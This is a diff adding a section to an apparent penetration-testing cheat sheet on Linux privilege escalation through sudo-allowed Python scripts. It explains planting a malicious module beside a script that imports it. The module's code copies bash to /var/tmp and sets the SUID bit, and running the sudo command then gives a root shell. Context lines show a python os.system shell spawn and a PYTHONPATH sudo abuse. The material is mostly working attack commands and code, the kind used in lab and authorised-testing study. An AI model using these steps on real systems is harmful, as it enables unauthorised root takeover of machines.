@@ -2747,6 +2747,47 @@ python3 -c 'import os; os.system("/bin/sh")'
 sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
 ```
 
+#### Sudo Python script importing a writable local module
+
+If `sudo -l` allows a specific Python script and the script imports a non-standard module, check whether you can write to the script directory. Python searches the script's directory before the standard library, so `SETENV` is not required in this case.
+
+```bash
+sudo -l
+# (ALL) NOPASSWD: /usr/bin/python /home/walter/wifi_reset.py
+
+cat /home/walter/wifi_reset.py
+# import wificontroller
+```
+
+Drop a module with the imported name beside the script:
+
+```bash
+cat > /home/walter/wificontroller.py << 'EOF'
+#!/usr/bin/python
+import os
+
+def stop(interface, val):
+    os.system("cp /bin/bash /var/tmp/bash")
+    os.system("chmod +s /var/tmp/bash")
+
+def reset(interface, val):
+    pass
+
+def start(interface, val):
+    pass
+EOF
+```
+
+Run the allowed sudo command and use the SUID shell:
+
+```bash
+sudo /usr/bin/python /home/walter/wifi_reset.py
+/var/tmp/bash -p
+id
+```
+
+If you get `AttributeError: module has no attribute ...`, the hijack worked; add the missing function name to the malicious module and rerun.
+
 ### Manual Polkit Priv Esc Checks
 
 * POC:&#x20;
